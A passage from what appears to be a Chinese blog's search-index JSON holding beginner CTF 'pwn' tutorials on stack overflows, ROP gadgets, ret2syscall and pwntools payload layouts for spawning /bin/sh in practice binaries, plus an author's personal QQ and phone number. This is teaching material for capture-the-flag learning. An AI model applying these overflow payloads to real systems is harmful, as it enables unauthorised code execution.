所以我们输入的是system(&#x2F;bin&#x2F;sh)，但是实际上计算机他不能读懂这段代码是什么意思 他要先进行编译，将其转化为自己能读懂的汇编语言 所以system(&#x2F;bin&#x2F;sh)用汇编语言来表示也可以转化为 12345pop eax 系统调用号载入， execve为0xbpop ebx 第一个参数， /bin/sh的stringpop ecx 第二个参数，0pop edx 第三个参数，0int 0x80 仔细思考一下，静态链接是将静态库在程序运行前就载入于文件中 所以，我们有了思路，既然静态链接导致的后果是文件过于庞大，因为其加载了静态库 所以我们可以在程序文件中搜索特定的汇编语言，将其一条条串连起来 这里我觉得有必要再插入一段说明，关于这个串连 我们是如何进行栈溢出的，实际上是覆盖ret addr来达到我们控制程序执行流的目的对吧 所以我们只需要确保每一个汇编代码执行完了以后都有一个ret指令，我们就可以使程序执行流按照我们预想的方式来跳转 那么我们又该如何寻找这些汇编代码呢？这里就用到了我们刚才提过的ropgadgets工具 ropgadgets我们在linux终端中输入 1ROPgadget -binary 文件名 --only&quot; 要搜索的 &quot; 于是，我们得到了 pop eax&#x2F;ebx 的地址 这里是是否还有一个疑问？欸他这里是连在一起的啊，就比如第一行pop eax和pop ebx是连在一起的怎么办？ 很简单，我们只需要同时传入他们各自所需要的参数即可 我们再搜索ebx.ecx.edx 以及int 80h系统调用和bin&#x2F;sh 到这里为止，我们就清楚了rop构造执行流的完整思路，接下来我们用一道例题来演示 ret2syscall我们先用checksec检查他开启了哪些保护机制以及查看他的位数 打开了NX保护机制，我们无法在栈中读写数据，所以只能采用构造ROP执行流的办法 再用ida打开看一下main函数写了什么 可以看到gets函数，判断应该也是一个栈溢出题 但是没有给我们提供system函数地址和字符串binsh地址 所以我们这里利用ROP构造 我们来查找pop eax等汇编代码的地址 得到了地址之后，我们开始构造payload","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"基础知识1","slug":"基础知识1","date":"2022-09-16T04:46:22.000Z","updated":"2022-09-22T14:07:26.171Z","comments":true,"path":"2022/09/16/基础知识1/","link":"","permalink":"http://example.com/2022/09/16/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%861/","excerpt":"","text":"本文用于简单介绍部分基础知识，详细请自行了解 并且为最初版的缘故，彼此之间并没有递进的关系，属于是我什么时候学到了就塞进来，所以此篇在学习时可以跳过，偶尔进来看看扩展知识点 缓冲区缓冲区又称为缓存，它是内存空间的一部分。也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。 缓冲区的作用是什么？我们为什么不能直接进行硬盘和计算机之间的交互？ 当我们在从硬盘中读入数据时，我们先把硬盘中的数据放入缓冲区，计算机再去缓冲区中读取数据，缓冲区中的数据被读取完了以后，缓冲区再去硬盘中读取数据 这样可以减少硬盘的读取次数，提高使用寿命 再加上计算机在缓冲区中的读取速度远远大于读取硬盘中的数据，运行效率也得到提升 做个直观的比喻 你掉落了100根牙签在地上，没有缓冲区的情况是 你弯腰捡完一根牙签就起身把他放回桌子上，接下来继续重复流程 而有了缓冲区以后，你弯腰捡完牙签，你会先把他放在手上，等手中的牙签数量足够多的时候，你才会起身放回桌面 虚拟机虚拟机通过软件模拟的具有完整功能的，能够运行在一个与物理机或和其他虚拟机环境隔绝的计算机系统 在物理机中能实现的系统操作在虚拟机中都能够实现 虚拟机的硬盘和内存容量需要从物理机中借用一部分 常常用来搭建linux操作系统 c语言文件描述符Linux 中一切都可以看作文件，包括普通文件、链接文件、Socket 以及设备驱动等，对其进行相关操作时，都可能会创建对应的文件描述符。文件描述符是内核为了高效管理已被打开的文件所创建的索引，用于指代被打开的文件，对文件所有 I&#x2F;O 操作相关的系统调用都需要通过文件描述符。 我们可以通过open函数系统调用得到一个指向该文件的描述符 这里我懒，借用文件描述符了解一下 - 知乎 (zhihu.com)的实验数据，感兴趣的可以自己看 我们会发现文件描述符是一个非0正数 标准输入：0 标准输出：1 标准错误：2 这三个文件描述符默认情况下是开启的 文件描述符遵守着这样一个原则(非专业性原则，别盲目信服，有错误欢迎指出) open函数总是返回最低的未打开的描述符 此时如果我们open一个文件，这个文件的文件描述符就是3 说了这么多，我们拿一题例题来直观感受 13行的close函数关闭了文件描述符1(标准输出) 而后又打开了文件flag.txt，此时flag.txt对应的文件描述符本应该是3 但是由于此时1被关闭了，多出了一个空余，根据原则，将优先返回最小的文件描述符，所以此时flag.txt对应的文件描述符就应该是1 read和write的用法这里不做解释了，适当培养自主查找资料并且理解的能力 直接调用call system和system的区别我们在构造payload时，有时会遇到溢出长度不够的情况 例如这题中(32位)，读入的数据长度为40个字节，而v1距离ebp28个字节，这里存在栈溢出 但是当我们想构造payload时我们会发现，按照正常的调用system时 payload &#x3D; cyclic(28)+cyclic(4)+p32(system_addr)+p32(0xabcdabc)+p32(binsh_addr) 我们发现payload的实际长度已经超过了可以读入的字节数 不妨从为什么system函数地址和参数要隔一个垃圾数据的原理来入手 我们这样编写payload的目的是调用system(‘&#x2F;bin&#x2F;sh’) 接下来用图像演示payload输入后的栈状况，利于理解 这里注意箭头指向，从下到上为由高地址向低地址，所以要注意buf是我们可以用来填充栈的变量 ret addr是我们要用来自由跳转的返回地址 所以我们构造的payload的cyclic（32）就会覆盖buf和ebp的空间 ret addr相当于ret system_addr 此时，由于system自己的汇编代码，他被弹出到eip后，会在原来栈的位置留下caller’s ebp 如下图 根据调用协议，system会去寻找低于他的ebp的两个字长处的数据作为他的参数，所以binsh_addr处的字符串&#x2F;bin&#x2F;sh就成为了system的参数 而体现给我们的就是，system_addr和参数间需要隔着一个垃圾数据 但是为什么调用call system就不需要中间这个垃圾数据呢？ 我们对于call指令进行详解一下 call指令： 第一步：先将call指令的下一条指令的CS和IP入栈（当然如果是段间转移就要将CS和IP入栈，如果是段内转移就只要将IP入栈） 第二步：就是操作与call对应的jmp指令 所有的call指令都是可以用上面的两步来确定的，这是个通用的法则。 所以call system后是不会跳转到下一个地址，因为他没有ret 所以函数地址和参数地址之间并不需要一个垃圾数据作为返回地址 这样就节省了一个垃圾数据的字长 栈对齐首先我们得知道为什么要进行栈对齐，以及栈对齐是个什么原理 栈对齐旨在尽可能在少的内存访问周期内读取数据(听不懂没关系，记结论也是一种美德) 即栈顶指针必须是16字节的整数倍 所以我们通常用ROPgaget来获取ret的地址 借助ret来进行栈对齐 ret怎么进行栈对齐？ ps:以下为本人推论，可信度不高 我们知道，ret的作用是弹出栈顶的一个字长到ip寄存器中 对于64位操作系统，一个字长就是8字节 如果此时栈顶指针末尾数字为8(即差一个字长，8字节才能为16字节整数倍) 这时候我们在返回地址处(这里不好理解，不过经过我自己的实验，在栈溢出中，不能放在垃圾数据前或中，不能放在栈顶，不能破坏payload原有结构，比如payload&#x3D;cyclic(xx)+p64(rid_addr)+p64(data_addr)中，如果ret放在rid_addr和data_addr就会破坏其原有的向rdi中传入参数的目的) 总结一下，如果有时候exp明明都对了，但就是pwn不成功，有可能是栈没有对齐导致的，可以gdb看一下栈顶地址，或者直接找对位置放个ret_addr python3中的byte型和str型首先我们要知道为什么要有byte型 在计算机发展初期，由于英文只有26个字母，相对比较容易做编译工作 所以早期的字符编码规范时ascii码 但是计算机发展普及后，多个国家的文字如何编译就成了问题 于是UTF-8编码应运而生，它规定英文字母系列用1个字节表示，汉字用3个字节表示等等 它兼容ASCII，可以解码早期的文档。 以汉字中文作为例子 byte：b’\\xe4\\xb8\\xad\\xe6\\x96\\x87’ str：**’中文’** byte型的作用是用来传输和存储数据，即str型的中文在传输时将encoude成byte型，需要使用时再decode成str型 那既然str型的数据在传输和存储的过程中，python会自动将我们的数据编码解码 那byte型的数据用意何在？ 使用byte型实质上是告诉Python，不需要它帮你自动地完成编码和解码的工作，而是用户自己手动进行，并指定编码格式 并且由于python明确规范了byte型和str型，这二者就不能混用 python中单双引号区别“”和’’都是为了用来定义一个字符串类型的数据 二者其实本质上没有区别 当我们需要定义一个需要引号的字符串时，这二者就可以用来这样表示： “我需要一个’引号’来表示我的字符串” strlen绕过我们首先得了解，一段字符串是以’\\0’来标记结尾的 即当strlen识别到\\0时就会停止判断当前字符串的长度，那我们要绕过strlen就可以通过构造字符串时将其开头以\\0填充","categories":[{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"栈溢出","slug":"32位栈溢出","date":"2022-09-15T04:26:15.000Z","updated":"2022-09-23T13:52:32.427Z","comments":true,"path":"2022/09/15/32位栈溢出/","link":"","permalink":"http://example.com/2022/09/15/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"继上文点到栈溢出的基础原理，本文来详细演示如何完成一题栈溢出 checksec的使用及保护机制了解操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险 在我们开始尝试做题之前，我们先得知道这道题开启了哪些安全机制，我们又该如何绕过其安全机制 这里便使用到了checksec工具 Arch：程序架构信息。判断是拖进64位IDA还是32位？exp编写时p64还是p32函数？ RELRD:Relocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。部分RELRO 易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入&#x2F;bin&#x2F;sh\\x00获得shell完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。 （看不懂没有关系 ，后续学习将会接触到plt和got表的相关知识） Stack：由上文可知，在我们进行栈溢出的时候，只需覆盖ret addr就能达到操控程序执行流的目的，但此项保护机制，在栈中会随机生成一段数据，在函数返回的时候，会检验这段数据是否正确，如果不正确，程序就会崩溃退出，这段数据在liunx中被称为canary NX:NX enabled如果这个保护开启就是意味着我们对栈中数据没有执行权限，我们无法在栈中自由更写，但是通过ROP构造执行流的办法可以绕过这个保护(同样将在接下来的学习中讲到) PIE:pie保护机制和ASLR相类似，我们已经知道每个数据在计算机中都有自己相应的地址，通过寻址计算机可以成功调用他们，ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 技术则在编译时将程序编译为位置无关, 即程序中的地址在每次运行时都会发生变化，我们将在后续的学习中接触到pie ida使用和漏洞分析通过checksec我们可以得知此题为32位，我们将其拖进32位ida查看 左边的function name是此二进制文件中的函数列表，通常主函数的名称是main 右侧便为此文件的汇编代码 我们可以按下f5进行ida反编译，将其转化为c语言代码的形式 main函数的组成相当简单，只有一个子函数shell，我们点进去看看 第三行，定义了一个buf变量，那么后面的esp+0h和ebp-48h是什么意思？ 我们进行栈溢出的目的是为了覆盖ret addr 从而将程序的返回地址修改成我们需要的，此时read读入的变量buf的位置就是位于ebp再往上0x48处的栈顶 所以我们可以得知，我们赋值的变量buf离ret addr差了0x48+0x4个字节 这里为什么还要加4？如果是64位呢，还是加4吗 我们之前说过了，一个字长对应的字节是根据位数的不同来决定的 此时需要在0x48的数据上再加上0x4是因为我们离ret addr还隔着一个ebp，一个字长的距离 接下来我们看回程序，输出语句”welcome to NISACTF” 在return处调用了函数read，读入了0x60字长的数据，而此时我们需要溢出的数据长度为0x48+0x4+0x4(我们用来覆盖ret addr的数据) 这里就出现了栈溢出漏洞，但是此时我们还需要system(&#x2F;bin&#x2F;sh)的地址，以达到获取flag的目的 我们可以依法炮制，翻阅其他函数的内容，我们发现这题的作者并没有直接给我们 那么system(&#x2F;bin&#x2F;sh)就需要我们自己构造 我们接着使用shift+f12来打开string窗口，一键找出所有的字符串 我们惊喜的发现，在data段(不清楚什么是data段的，请仔细观看谢师傅的视频，为虚拟内存映射的相关知识)中存在字符串&#x2F;bin&#x2F;sh 拥有这段字符串意味着什么？ 我们知道，函数的执行一般需要参数 例如system(&#x2F;bin&#x2F;sh)中的&#x2F;bin&#x2F;sh便是system的参数 所以，我们接下来的任务就是去找到system函数的地址，并且把&#x2F;bin&#x2F;sh这段字符串作为参数，就可以实现system(&#x2F;bin&#x2F;sh) plt表和got表这里举一个简单的例子 某公司开发了一款软件，实现的代码调用了大量的函数，这些函数的每次实现都需要在文件(这个软件)中对应的前置来实现他 这样子就增大了文件的体积 但是如果将实现这些函数的前置在程序运行时载入到内存中呢？ 这样每一款软件都无需额外的内存占用，并且用户也能成功运行 所以这里就出现了plt表和got表的概念 当我们需要调用system函数时，他会去自动寻找system的plt表 其plt表中存储了system函数的got表的地址 其就是system在libc(libc同样在谢师傅的视频中有所介绍)中的地址 但是我们在第一次调用system函数的时候，其got表中的地址并不知道system在libc中的哪里 于是第一次调用无果后，system的plt表便会收到消息，去给got表找到system在libc的位置 经过原定好的代码实现，plt表便查找到了libc中system的地址，并将其填充给了got表 接下来plt表再去got表中，他就得知了地址，就可以成功调用system函数 所以我们可以将整个流程用下图来展示 而在之前程序已经调用了system函数进行echo 字符串，所以我们此时再去system的plt表中就能获取到system在libc中的地址 这里你可能会无法理解，但是在初期的学习我们只需要记住，plt表是调用该函数，got表中存的地址是为了获得真实地址 发现漏洞后，接下来就要进行shellcode的编写，开始攻击 以下shellcode的编写需要python基础，这里同样不做解释，请自行学习） 但我个人是没有进行任何额外的python学习(截止到我学习到堆)，不知道这条路是否合理化，请根据自己在学习中遇到的情况自行斟酌 shellcode的编写 –第二行建立与靶场(概念不做解释，自行查找)的联系，名称不一定要是io，“ ”中为ip地址，逗号后为端口 –第三行为后续我们获得system的plt表内容的前置条件，括号中为”.&#x2F;文件名” –第四行，接收程序的输出内容，简单的是xxx.recv() [xxx为你先前命名的名称，比如我的io] io.recv()将会接收一行的数据，以\\n为结束判定 而io.recvuntil(“ “)将会接收到” “内的数据才停止，并且包括“ ”内的数据 如果不想接收“ ”内的数据，可以这样编写io.recvuntil(“hello”,drop &#x3D; True) –第五行，为变量system_addr赋值 赋值的内容为system的plt表中的内容 –第六行，编写payload，cyclic创建括号内自定义字长的垃圾数据用来填充ret addr前的内容 随后我们要注意p32()这个语法，为什么要使用它？ 首先，send系列只能传参字符串，recv接收回来的也只能是字符串，这是因为网络传输的规定! 所以，对于地址值0x1234，就只有变成字符串传出去 你应该也能猜到为什么是p32，64位程序使用的便是p64 接下来我们可以理解p32(0x804a024)就是字符串&#x2F;bin&#x2F;sh的地址，那么中间的0xabcdabc又是什么？ 这里先粗略进行一个介绍，具体的介绍将在后续进行一个专门的文章(可见其中的复杂) 我们只需要知道，正常的调用system（即非使用call system的汇编代码地址），要想成功为其传参，函数和参数之间要有一个垃圾数据 所以他的形式可以不为abcdabc可以是任何符合格式的地址 –第七行，发送我们构造好的payload，进行栈溢出攻击 最后，io.interactive()来与终端交互，如果pwn成功，那么我们就可以使用ls来查看当前目录下有哪些文件 我们利用python3（需要你的虚拟机中安装好了python3）发送这段exp试试 可以看到我们输入ls后，成功列出了目录的文件，我们发现了一个名为flag的文件，那么这就是我们的最后答案了 cat flag(liunx使用命令请自行百度) 答案到手！ 在阅读完本文后，相信你对栈溢出的解法已经有了一个大致的理解，接下来请自行前往ctfshow或者其他平台独立解题","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"博客使用须知","slug":"博客使用须知","date":"2022-09-14T12:16:54.000Z","updated":"2022-09-16T11:02:25.586Z","comments":true,"path":"2022/09/14/博客使用须知/","link":"","permalink":"http://example.com/2022/09/14/%E5%8D%9A%E5%AE%A2%E4%BD%BF%E7%94%A8%E9%A1%BB%E7%9F%A5/","excerpt":"","text":"在开始借助本博客的学习pwn前，有以下几点需要知道 1.博客的建立初衷来自于本人在学习pwn时，面对庞杂的知识点，不知道从哪里开始学习，学习什么完后又要学习什么，所以将站在我的角度给予本人对于pwn学习方向的思路引导 2.本文中的很多知识点描述并不全面，强烈建议也是必须建议你在看完本博客后，能借助博客提到的内容自行去wiki或其他渠道扩展知识面 3.由于本人目前水平不足，只能提及一些我学习过程中遇到的问题，所以各位师傅在阅读完博客后，有任何疑问或者建议都可以联系我来进行修正，欢迎指导！ qq：2234615902 phone：18206039087","categories":[{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"栈的基础知识","slug":"栈的基础知识","date":"2022-09-13T12:20:05.000Z","updated":"2022-09-20T08:17:39.338Z","comments":true,"path":"2022/09/13/栈的基础知识/","link":"","permalink":"http://example.com/2022/09/13/%E6%A0%88%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"","text":"什么是栈？在了解栈相关的知识前，我们需要一些汇编代码的基础 可以将谢师傅的视频作为阅读本文的前提，接下来所出现的名词将不再作解释（19分51秒到35分32秒，以及56分31秒到1时4分为栈部分内容） [pwn入门]0基础学习程序与计算机-2_哔哩哔哩_bilibili 无妨从栈在语文中的定义理解—&gt;存储货物或供旅客住宿的地方,可引申为仓库、中转站。 在计算机系统中，栈则是一个具有以上属性的动态内存区域。程序可以将数据压入栈中，也可以将数据从栈顶弹出。在i386机器中，栈顶由称为esp的寄存器进行定位。入栈的操作使得栈顶的地址减小，出栈的操作使得栈顶的地址增大（栈是从高地址向低地址增长）。 栈分为顺序栈，共享栈，链式栈 这里只介绍顺序栈 用一个简单的例子来帮助我们理解栈的作用： 当我们在打开网页A时，我们关闭网页A，进入网页B，关闭网页B，进入网页C 这个时候如果我们想要返回网页A，我们有两种办法1.重新打开网页A 2.使用回退返回网页A 在使用第二种方法的过程中，我们会发现需要先返回网页B，浏览器 “回退” 功能的实现，底层使用的就是栈存储结构 当你关闭网页A后，A就会入栈，我们可以将其理解为上图的a1，关闭网页B后，a2入栈 所以当我们使用回退的时候，位于低地址的a2就会先于a1出栈，给予用户的体现就是我们先返回了网页B再返回网页A 有点难以理解？A是如何入栈？入栈后，栈的结构肯定不会只是简简单单的a1，a2 这里引入内存地址这一概念(这里介绍的是物理内存地址) 什么是内存地址？ 内存地址是一个编号，代表内存空间，内存地址是一种介于硬件软件等不同层级的数据概念，用来访问电脑内存中的数据 基于操作系统位数的不同，内存地址的表现形式也有所不同 比如32位下的地址可以为0x00000001 64位下的地址可以为0x0000000000000001 这里的地址表现形式不同于我们常用的10进制 而是16进制 又出现了一个新的知识点，16进制数，似乎在ctf中很常见？ 在高中，我们学过二进制的知识，16进制也是同理 16进制个人认为网上的一些讲解方式虽然详细，对于进制有着全面的帮助，但本文出于方便理解，决定只是对16进制进行引导 0x1-0x9对应着10进制中的1-9，这个我们可以很快速的理解，那么轮到十进制中的10呢？是0x10？显然不是 数字不够用来表示了怎么办？我们还有字母可以选择 0xa-0xF对应着十进制中的10-15 (这里可以注意到前后的大小写并不一致，是因为16进制的书写对于大小写并没有形式上的要求) 这样说是否就大体了解清楚了16进制？这里可以再思考一个小问题，那当我们要表示十进制的16怎么办呢？ 逢16进1，16就表示为了0x10，接下来的17，18 我们就可以表示为0x11和0x12 让我们把思绪收回到内存地址 内存地址(物理内存地址)程序和数据平常存储在硬盘等存储器上，不管你开机或关机了，它们都是存在的，不会丢失。硬盘可以存储的东西很多，但其传输数据的速度较慢。所以需要运行程序或打开数据时，这些数据必须从硬盘等存储器上先传到另一种容量小但速度快得多的存储器，之后才送入CPU进行执行处理。这中间的存储器就是内存。 无论何种存储器，软盘、硬盘、光盘或者内存，都有地址。因为它们要存储数据，所以就必须按一定的单位的数据分配一个地址。有了地址，程序才能找到这些数据。这很好理解，想想你们家为什么要有门牌号即可。 内存地址将一切数据和命令进行了数字化，他知道其各自对应的位于内存中的哪个位置，这个位置的表现形式就是内存地址 所以这里可以做一个总结，内存地址并不是数据本身，而是类似于指向标的东西指引计算机寻址找到数据 例如电脑使用中的快捷方式，他可以出现在任何目录却都能打开你所需要的程序，其原理就是计算机基于内存地址的寻址 现在我们已经大致了解了地址，但是我们仍然有一个疑问，为什么随着操作系统位数的不同，地址的表现形式也不同呢？ 32位64位操作系统在查阅资料时，我发现我对于这一方面的知识非常薄弱，所以操作系统位数的内容篇幅将远超其他部分 在挑选电脑时，我们会困惑于繁多的cpu类型，诸如常见的拯救者y9000p所搭载的i7-12700h 这里以inter酷睿处理器的命名规则举例(amd的可以自行了解)，我们会发现有i3，i5，i7，i9四种 数字越多，处理器性能越好？这是一个常见的误区 在同代产品中，以核心数和线程数作为区分标准 核心数和线程数一开始，cpu只有单核心，所以只能同时进行单进程&#x2F;线程任务 类似于人类的团队，只有一个人的情况下，只能同时进行一项任务 随着计算机的发展，单核心的cpu性能出现不足，cpu产商开始在单个物理cpu上增加核心 这时候我们的团队就迎来的第二个人手，他可以在第一个执行任务时，去独立完成另外的任务 同时多线程技术本质也是一样，是为了提高单个cpu核心同一时刻能够执行的多线程数的技术 类似于团队中的一名队员同时处理多项任务 cpu位数你可能会说，上述的核心数和线程数和操作系统位数有什么联系？没有哦，只是一个扩展，做为导入我们cpu位数的前置知识 CPU位数指的是一个时钟周期内处理器同时寄存和处理的二进制位数，如何理解这句话? 我们先要知道所有的数字信息在计算机中都是用数字代码表示，为了电路处理方便，就用二进制表示，电路用高电平、低电平表示2个数码“1”和“0”，计算机中所有的信息从输入，存储，处理到输出都是用基于二进制的电信号表示 对于CPU位数，他等同于CPU中寄存器的位数 &#x3D; CPU一次并行处理的数据宽度。CPU位数越多，则寻址位数越多，处理能力就越强。 操作系统位数操作系统位数的概念是基于cpu位数的 32位的cpu只能安装32位的操作系统 而64位的cpu既可以安装32位的操作系统也能安装64位的操作系统 字长，字节，比特回到刚才的话题，为什么操作系统位数会影响到地址的表现形式？我们似乎仍然没有搞懂这个问题 我们还需要引入字长，字节，比特的概念 在32位操作系统的环境下，一个字长所对应的是4个字节 在64位操作系统的环境下，一个字长所对应的是8个字节 而一个字节对应8比特，这无关于操作系统位数 我们拿刚才32位操作系统下的地址举例 ：0x11223344(为了方便理解，我将相邻的两个用相同的数字表示) 11，22，33，44各自所对应的就是一个字节，因为32位操作系统下的一个字长所对应的是4字节，所以长度就为0x00000000 栈的具体结构前文我们以后退作为例子，但仍然有一个疑问，栈的具体结构是怎么样的？ 我们简单举一个函数跳转的例子 函数A运行过程中跳转到了函数B(A和B的关系比如上一篇文章里面的main函数和fun函数，fun函数是main函数到的子函数) 此时就会将函数A的栈顶地址放在函数B的栈底，这样当函数B执行完了以后，esp就可以指向ret addr使得eip返回到函数A的栈顶 （esp，eip如果不清楚概念，请折返回文章头观看谢师傅的视频） 不知道了解到这里，你是否有一个大胆的想法？我们已经知道，我们pwn的最后目的是写入一段shellcode，以便我们取得flag 而通常这个shellcode是要调用system(&#x2F;bin&#x2F;sh)这一函数 已经知道了函数B会返回到ret addr所指向的地址，是否可以修改返回地址？使执行流跳转到system所在的地址 没错，这就是我们接下来栈溢出的基本原理！","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"pwn入门指南","slug":"pwn入门指南","date":"2022-09-13T06:11:35.000Z","updated":"2022-09-16T11:02:32.642Z","comments":true,"path":"2022/09/13/pwn入门指南/","link":"","permalink":"http://example.com/2022/09/13/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/","excerpt":"","text":"本文旨在简要概括ctf中pwn方向的主要学习知识，以供不知道学习什么方向或者不知道如何学习pwn的人参考 什么是pwn就我个人在刚决定入门这个方向的时候，我是希望有人给予我一个清楚的定义，即这个方向是如何完成ctf中的题目。所以最为关键的引导，我决定通过一个简单的pwn题来向你体现pwn是一个怎样的方向，并且就我个人而言，我是不希望将pwn的教程写的又臭又长，接下来的一系列教程将以尽量幽默形象的语言风格叙述，那让我们以fstar 21届的校赛pwn题第一题作为例题开讲 2022 NISACTF pwn-ReorPwn? 通常pwn题的附件是一个二进制文件，图中所用到的工具ida可以将二进制文件反编译成c语言代码 到了这里，pwn手的两个学习方向你应该也清楚了—&gt;ida的使用和c语言的代码审计 依我个人的学习经历，我觉得c语言学习到指针和结构体的进度，就足够你完成栈(pwn的一种题型)的大部分知识 ida的使用也不需要刻意去百度学习，你将在栈部分的学习中大致掌握使用技巧 接着往下说，这里我假设你已经可以看懂本题的c语言表示，那么我们继续分析 3~5行的setvbuf用意于清空缓存区(相关概念后续将进行补充) 第六行 put输出了一行话，在pwn题中，题目描述，题目名称，又或者是程序中的语句，都可能是解题的关键提示 evcexe ot tnaw uoy tahw em lleT 第一眼 是不是觉得这不是一个正常的英文句子？ 不凡把他倒转过来试试 Tell me what you want to execve 我们记住这段话，接着往下看 第七行调用了gets函数，将用户输入的值赋给了变量a 第八行出现了一个fun函数？似乎不是一个很常见的函数，有可能是出题人自己定义的一个函数，我们可以双击点进去查看 将用户输入的a进行倒置 比如你输入了sh 此时return的值便为hs PS：这里介绍一个实用的小技巧，很多时候我们看不懂这段代码是干什么的怎么办，可以自己运行一下程序 啊，你问如何运行这个程序， 你似乎不能双击打开他？ 这里就又牵扯到了windows和liunx文件类型(自行百度) 总之，我们需要一台搭载linux操作系统的电脑，但面临的问题是，或许没有多余的资金来浪费又因为两台电脑间传输文件的困难 所以我们这里引入一个新的概念，虚拟机 什么是虚拟机？我们先把这个疑问抛到一边，后续的文章我们再来介绍，本文的目的旨在笼统介绍pwn题 将文件运行之后 我们需要给变量a赋值，这里随便写一个hello 欸 这里好像报错了 仔细看 sh: 1：olleh：not found olleh？ 这不是hello倒过来吗 倒？前面的语句你是否还记得 倒转？ 灵感在你脑中乍现了吧 我们虽然看不懂fun函数中的for 但是可以通过尝试的办法来明白他是起到了一个什么作用 所以 我们输入的值 在被赋值给a后会被倒转 再执行system(a) 又一个疑问了 system(a)是什么？ 百度你可以获得system函数权威严谨的定义 这里我简单说一下 作为前期栈学习 你只需要了解 你的一切行为 都是为了获得目标终端的控制权限 从而获取flag 这种方法通常可以是调用system(&#x2F;bin&#x2F;sh)这串代码来实现的 所以 本题的思路已经很明显了 要想system函数中的值为&#x2F;bin&#x2F;sh的话 我们赋值的a 就要为hs&#x2F;nib&#x2F; 可以看到 当我们输入hs&#x2F;nib&#x2F;后 我们再输入ls 我们就列出了当前目录下的文件列表，这意味着我们成功调用了system(&#x2F;bin&#x2F;sh) 完成了一次pwn 到了这里 相信你已经对于pwn是什么有了一个清楚的认知 如果你对此感有兴趣 欢迎主攻pwn方向 成为一名pwn爷 本文结束","categories":[{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"}],"tags":[]}],"categories":[{"name":"虚拟机","slug":"虚拟机","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"},{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"},{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"}],"tags":[]}